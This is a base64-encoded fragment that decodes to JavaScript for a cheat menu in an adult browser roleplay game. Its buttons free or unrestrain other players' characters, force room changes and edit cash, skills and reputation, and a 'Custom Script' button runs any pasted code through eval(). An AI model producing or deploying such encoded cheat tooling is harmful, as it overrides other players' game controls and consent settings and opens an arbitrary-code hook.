lciI7CiAgICByZXR1cm4gYnV0dG9uOwp9CgovLyBDcmVhdGUgc2VwYXJhdG9yIGZ1bmN0aW9uCmZ1bmN0aW9uIGNyZWF0ZVNlcGFyYXRvcigpIHsKICAgIHZhciBzZXBhcmF0b3IgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJociIpOwogICAgc2VwYXJhdG9yLnN0eWxlLm1hcmdpbiA9ICI1cHggMCI7CiAgICByZXR1cm4gc2VwYXJhdG9yOwp9CgovLyBGdW5jdGlvbiB0byBkaXNwbGF5IGN1c3RvbSBjb250ZXh0IG1lbnVfX19fXwpsZXQgY29udGV4dE1lbnVUaW1lciA9IG51bGw7CmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImNvbnRleHRtZW51IiwgZnVuY3Rpb24oZXZlbnQpIHsKICBpZiAoY29udGV4dE1lbnVPcGVuKSB7CiAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpOwogICAgcmV0dXJuOyAvLyBQcmV2ZW50IGR1cGUgbWVudXMKICB9CiAgaWYgKHdpbmRvdy5nZXRTZWxlY3Rpb24oKS50b1N0cmluZygpICE9PSAnJykgewogICAgLy8gQWxsb3cgcmVndWxhciBjb250ZXh0IG1lbnUgd2hlbiB0ZXh0IGlzIGhpZ2hsaWdodGVkCiAgICByZXR1cm47CiAgfQogIGV2ZW50LnByZXZlbnREZWZhdWx0KCk7CiAgdmFyIGNvbnRleHRNZW51ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgY29udGV4dE1lbnUuc3R5bGUucG9zaXRpb24gPSAiZml4ZWQiOwogIGNvbnRleHRNZW51LnN0eWxlLmJhY2tncm91bmQgPSAibGluZWFyLWdyYWRpZW50KHRvIGJvdHRvbSwgd2hpdGUsIHdoaXRlKSI7CiAgY29udGV4dE1lbnUuc3R5bGUuYm94U2hhZG93ID0gIjAgMCAzcHggIzk5OSI7CiAgY29udGV4dE1lbnUuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjhweCI7CiAgY29udGV4dE1lbnUuc3R5bGUuekluZGV4ID0gIjk5OTkiOwogIGNvbnRleHRNZW51LnN0eWxlLmJvcmRlciA9ICIycHggc29saWQgYmxhY2siOwogIGNvbnRleHRNZW51T3BlbiA9IHRydWU7CiAgaWYgKCdvbnRvdWNoc3RhcnQnIGluIHdpbmRvdykgewogICAgLy8gSGFuZGxlIGxvbmcgcHJlc3Mgb24gbW9iaWxlIGRldmljZXMKICAgIGNvbnRleHRNZW51VGltZXIgPSBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICBjb250ZXh0TWVudS5zdHlsZS50b3AgPSBldmVudC50b3VjaGVzWzBdLmNsaWVudFkgKyAicHgiOwogICAgICBjb250ZXh0TWVudS5zdHlsZS5sZWZ0ID0gZXZlbnQudG91Y2hlc1swXS5jbGllbnRYICsgInB4IjsKICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChjb250ZXh0TWVudSk7CiAgICAgIGNvbnRleHRNZW51T3BlbiA9IHRydWU7CiAgICB9LCA1MDApOwogIH0gZWxzZSB7CiAgICAvLyBIYW5kbGUgcmlnaHQgY2xpY2sgb24gZGVza3RvcCBkZXZpY2VzCiAgICBjb250ZXh0TWVudS5zdHlsZS50b3AgPSBldmVudC5jbGllbnRZICsgInB4IjsKICAgIGNvbnRleHRNZW51LnN0eWxlLmxlZnQgPSBldmVudC5jbGllbnRYICsgInB4IjsKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoY29udGV4dE1lbnUpOwogICAgY29udGV4dE1lbnVPcGVuID0gdHJ1ZTsKICB9CiAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbigpIHsKICAgIGNvbnRleHRNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICBjb250ZXh0TWVudU9wZW4gPSBmYWxzZTsKICAgIGNsZWFyVGltZW91dChjb250ZXh0TWVudVRpbWVyKTsKICB9KTsKICAgIAoKCiAgICAvLyBIZWFkZXIgd2l0aCBCQ00gbG9nbwogICAgdmFyIGhlYWRlciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgaGVhZGVyLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7CiAgICBoZWFkZXIuc3R5bGUuYWxpZ25JdGVtcyA9ICJjZW50ZXIiOwogICAgaGVhZGVyLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKCiAgICB2YXIgcHJvZmlsZVBob3RvID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CiAgICBwcm9maWxlUGhvdG8uc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7CiAgICBwcm9maWxlUGhvdG8uc3R5bGUud2lkdGggPSAiMzBweCI7CiAgICBwcm9maWxlUGhvdG8uc3R5bGUuaGVpZ2h0ID0gIjMwcHgiOwogICAgcHJvZmlsZVBob3RvLnN0eWxlLmJvcmRlclJhZGl1cyA9ICIyMCUiOwogICAgcHJvZmlsZVBob3RvLnN0eWxlLm1hcmdpblJpZ2h0ID0gIjEwcHgiOwoKICAgIHZhciBoZWFkZXJUZXh0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICBoZWFkZXJUZXh0LmlubmVySFRNTCA9ICI8Yj5Fc3NlbnRpYWxzPC9iPiI7CgogICAgaGVhZGVyLmFwcGVuZENoaWxkKHByb2ZpbGVQaG90byk7CiAgICBoZWFkZXIuYXBwZW5kQ2hpbGQoaGVhZGVyVGV4dCk7CgogLy8gQ3VzdG9tIG1haW4gYnV0dG9ucwogdmFyIGJ1dHRvbjEgPSBjcmVhdGVCdXR0b24oIlJlc3RvcmUgQ2hhcmFjdGVyIiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OlBsYXllci5BcHBlYXJhbmNlID0gQ2hhdFNlYXJjaFNhZmV3b3JkQXBwZWFyYW5jZS5zbGljZSgwKTsgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcik7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICAKfSk7CnZhciBidXR0b24yID0gY3JlYXRlQnV0dG9uKCJGb3JjZSBSb29tIFN3YXAiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6Q2hhdFNlbGVjdFN0YXJ0U2VhcmNoKCdYJyksQ2hhdFJvb21TZXRMYXN0Q2hhdFJvb20oJycpLGRvY3VtZW50WydnZXRFbGVtZW50QnlJZCddKCdJbnB1dENoYXQnKVsnc3R5bGUnXVsnZGlzcGxheSddPSdub25lJyxkb2N1bWVudFsnZ2V0RWxlbWVudEJ5SWQnXSgnVGV4dEFyZWFDaGF0TG9nJylbJ3N0eWxlJ11bJ2Rpc3BsYXknXT0nbm9uZScsQ2hhdFNlbGVjdFN0YXJ0U2VhcmNoKCdYJyksQ2hhdFJvb21TZXRMYXN0Q2hhdFJvb20oJycpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjMgPSBjcmVhdGVCdXR0b24oIkZyZWUgVGFyZ2V0IiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OkNoYXJhY3RlclJlbGVhc2VUb3RhbChDdXJyZW50Q2hhcmFjdGVyKSxDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShDdXJyZW50Q2hhcmFjdGVyKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKfSk7CnZhciBidXR0b240ID0gY3JlYXRlQnV0dG9uKCJSZW1vdmUgUmVzdHJhaW50IiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OkludmVudG9yeVVubG9jayhDdXJyZW50Q2hhcmFjdGVyLCBDdXJyZW50Q2hhcmFjdGVyLkZvY3VzR3JvdXAuTmFtZSk7CiAgICBJbnZlbnRvcnlSZW1vdmUoQ3VycmVudENoYXJhY3RlciwgQ3VycmVudENoYXJhY3Rlci5Gb2N1c0dyb3VwLk5hbWUpOwogICAgQ2hhdFJvb21DaGFyYWN0ZXJJdGVtVXBkYXRlKEN1cnJlbnRDaGFyYWN0ZXIsIEN1cnJlbnRDaGFyYWN0ZXIuRm9jdXNHcm91cC5OYW1lKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKfSk7CnZhciBidXR0b241ID0gY3JlYXRlQnV0dG9uKCJUYXJnZXQgU3RydWdnbGUgRGlmZmljdWx0eSIsIGZ1bmN0aW9uKCkgewogICAgamF2YXNjcmlwdDpkb3t2YXIgZGlmYz1wcm9tcHQoJ0RpZmZpY3VsdHlceDIwMS05NicpO313aGlsZSghKGRpZmM+PTB4MSYmZGlmYzw9MHg2MCkpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUhlYWQiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1Nb3V0aCIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU1vdXRoMiIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU1vdXRoMyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUFybXMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1IYW5kcyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUxlZ3MiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1FeWVzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtRmVldCIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbURldmljZXMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1BZGRvbiIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU5lY2siLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1OZWNrUmVzdHJhaW50cyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU5lY2tBY2Nlc3NvcmllcyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUJvb3RzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtSG9vZCIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU5vc2UiLCBkaWZjKTsKICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKEN1cnJlbnRDaGFyYWN0ZXIpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjYgPSBjcmVhdGVCdXR0b24oIk9wZW4gVGFyZ2V0IFdhcmRyb2JlIiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OkRpYWxvZ0NoYW5nZUNsb3RoZXMoKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKfSk7CnZhciBidXR0b243ID0gY3JlYXRlQnV0dG9uKCJDb21wbGV0ZSBTdHJ1Z2dsZSBNaW5pZ2FtZSIsIGZ1bmN0aW9uKCkgewogICAgY29udGV4dE1lbnVPcGVuID0gZmFsc2U7CiAgICBqYXZhc2NyaXB0OlN0cnVnZ2xlUHJvZ3Jlc3MgPTEwMDA7CiAgICBjb250ZXh0TWVudS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICBDaGF0Um9vbUNsaWNrQ2hhcmFjdGVyKFBsYXllcik7CiAgICAgICAgRGlhbG9nTGVhdmUoKTsKICAgIH0sIDUwMCk7CiAgICBzaG93VG9hc3RzY3BnKCk7Cn0pOwoKdmFyIGJ1dHRvbjggPSBjcmVhdGVCdXR0b24oIkludmlzaWJsZSIsIGZ1bmN0aW9uKCkgewogICAgamF2YXNjcmlwdDpJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgSGVpZ2h0OiAiLSIKICAgICAgfTsKICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcik7IAogICAgICB2aXNiID0gZmFsc2U7CiAgICAgIHNob3dUb2FzdHNjcGcoKTsKICAgICAgdXBkYXRlQ29udGV4dE1lbnUoKTsgCgogICAgCn0pOwoKdmFyIGJ1dHRvbjkgPSBjcmVhdGVCdXR0b24oIlZpc2libGUiLCBmdW5jdGlvbigpIHsKICBqYXZhc2NyaXB0OkNoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICBkZWxldGUgSW52ZW50b3J5R2V0KFBsYXllciwgJ0Vtb3RpY29uJykuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQ7CiAgQ3VycmVudFNjcmVlbiA9PT0gJ0NoYXRSb29tJyA/CiAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB2aXNiID0gdHJ1ZTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIHVwZGF0ZUNvbnRleHRNZW51KCk7IAogIAp9KTsKCnZhciBidXR0b24xMCA9IGNyZWF0ZUJ1dHRvbigiQ3VzdG9tIFNjcmlwdCIsIGZ1bmN0aW9uKCkgewogIGphdmFzY3JpcHQ6dmFyIHNjcnAgPSBwcm9tcHQoIlBhc3RlIHlvdXIgc2NyaXB0IGhlcmU6Iik7CiAgaWYgKHNjcnApIHsKICAgIGV2YWwoc2NycCk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgfQp9KTsKLy8gVHJhbnNpdGlvbiBzdHlsaW5nIGZvciB0aGUgYnV0dG9ucwpidXR0b24xLnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uMi5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjMuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b240LnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uNS5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjYuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b243LnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uOC5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjkuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b24xMC5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CgoKCi8vSG92ZXIgZXZlbnRzIGZvciB0aGUgYnV0dG9ucwpidXR0b24xLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewogICAgdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CiAgICB0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKICAgIH0pOwpidXR0b24xLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CiAgICB0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwogICAgfSk7CgpidXR0b24yLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b24yLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uMy5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uMy5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjQuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjQuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b241LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b241LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uNi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uNi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjcuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MC41cHgiOwp9KTsKYnV0dG9uNy5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjguYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjguYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b245LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b245LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uMTAuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjEwLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKLy9Ecm9wZG93biBNZW51X19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCgpmdW5jdGlvbiBmb3JjZWNsb3NlbWVudSgpIHsKICAgICAgY29udGV4dE1lbnUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgQ2hhdFJvb21DbGlja0NoYXJhY3RlcihQbGF5ZXIpOwogICAgICBEaWFsb2dMZWF2ZSgpOwogIGNvbnRleHRNZW51T3BlbiA9IGZhbHNlOwogIH0KCiAvLyBDcmVhdGUgdGhlIGRyb3Bkb3duIG1lbnUKdmFyIHNlbGVjdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNlbGVjdCIpOwpzZWxlY3Quc3R5bGUuYm9yZGVyUmFkaXVzID0gIjJweCI7CnNlbGVjdC5zdHlsZS5wYWRkaW5nID0gIjRweCI7CnNlbGVjdC5zdHlsZS53aWR0aCA9ICIyMDBweCI7CnNlbGVjdC5zdHlsZS5tYXJnaW5Ub3AgPSAiLTIwcHgiOwpzZWxlY3Quc3R5bGUubWFyZ2luUmlnaHQgPSAiMnB4IjsKc2VsZWN0LnN0eWxlLm1hcmdpbkJvdHRvbSA9ICIzcHgiOwpzZWxlY3Quc3R5bGUubWFyZ2luTGVmdCA9ICIycHgiOwp2YXIgb3B0aW9uMSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xLnZhbHVlID0gIm9wdDEiOwpvcHRpb24xLnRleHQgPSAiUGVyc29uYWxpc2F0aW9uIE1lbnUiOwpvcHRpb24xLnNlbGVjdGVkID0gdHJ1ZTsKb3B0aW9uMS5kaXNhYmxlZCA9IHRydWU7CnZhciBvcHRpb24yID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjIudmFsdWUgPSAib3B0MiI7Cm9wdGlvbjIudGV4dCA9ICJFZGl0IENhc2giOwp2YXIgb3B0aW9uMyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24zLnZhbHVlID0gIm9wdDMiOwpvcHRpb24zLnRleHQgPSAiTWF4IFNraWxscyI7CnZhciBvcHRpb240ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjQudmFsdWUgPSAib3B0NCI7Cm9wdGlvbjQudGV4dCA9ICJNYXggUmVwdXRhdGlvbiI7CnZhciBvcHRpb241ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjUudmFsdWUgPSAib3B0NSI7Cm9wdGlvbjUudGV4dCA9ICJQdXJjaGFzZSBFdmVyeXRoaW5nIjsKdmFyIG9wdGlvbjYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uNi52YWx1ZSA9ICJvcHQ2IjsKb3B0aW9uNi50ZXh0ID0gIlJlbGVhc2UgT3duZXIgQ29sbGFyIjsKdmFyIG9wdGlvbjcgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uNy52YWx1ZSA9ICJvcHQ3IjsKb3B0aW9uNy50ZXh0ID0gIisxIExBUlAgTGV2ZWwiOwp2YXIgb3B0aW9uOCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb244LnZhbHVlID0gIm9wdDgiOwpvcHRpb244LnRleHQgPSAiQmVjb21lIEVzY2FwZWQgUGF0aWVudCI7CnZhciBvcHRpb245ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjkudmFsdWUgPSAib3B0OSI7Cm9wdGlvbjkudGV4dCA9ICJCZWNvbWUgQ2x1YiBTbGF2ZSI7CnZhciBvcHRpb24xMCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xMC52YWx1ZSA9ICJvcHQxMCI7Cm9wdGlvbjEwLnRleHQgPSAiUmVsZWFzZSBDbHViIFRpdGxlIjsKdmFyIG9wdGlvbjExID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjExLnZhbHVlID0gIm9wdDExIjsKb3B0aW9uMTEudGV4dCA9ICJTZXQgR0dUUyBMZXZlbCI7CnZhciBvcHRpb24xMiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xMi52YWx1ZSA9ICJvcHQxMiI7Cm9wdGlvbjEyLnRleHQgPSAiU2V0IERvbS9TdWIgTGV2ZWwiOwp2YXIgb3B0aW9uMTMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTMudmFsdWUgPSAib3B0MTMiOwpvcHRpb24xMy50ZXh0ID0gIlNldCBOaWNrbmFtZSI7CnZhciBvcHRpb24xNCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xNC52YWx1ZSA9ICJvcHQxNCI7Cm9wdGlvbjE0LnRleHQgPSAiRm9yY2UgT3JnYXNtIjsKdmFyIG9wdGlvbjE1ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjE1LnZhbHVlID0gIm9wdDE1IjsKb3B0aW9uMTUudGV4dCA9ICJCQ00gRGlzY29yZCI7CnZhciBvcHRpb24xNiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xNi52YWx1ZSA9ICJvcHQxNiI7Cm9wdGlvbjE2LnRleHQgPSAiRm9yY2UgTG9iYnkiOwp2YXIgb3B0aW9uMTcgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTcudmFsdWUgPSAib3B0MTciOwpvcHRpb24xNy50ZXh0ID0gIkxBUlAgT3B0aW9ucyI7CnZhciBvcHRpb24xOCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xOC52YWx1ZSA9ICJvcHQxOCI7Cm9wdGlvbjE4LnRleHQgPSAiRW1vdGUgTWVudSAoYCArIEUpIjsKdmFyIG9wdGlvbjE5ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjE5LnZhbHVlID0gIm9wdDE5IjsKb3B0aW9uMTkudGV4dCA9ICJQZXJzaXN0YW50IFNldHRpbmdzIChgICsgUykiOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMSk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24yKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjMpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uNCk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb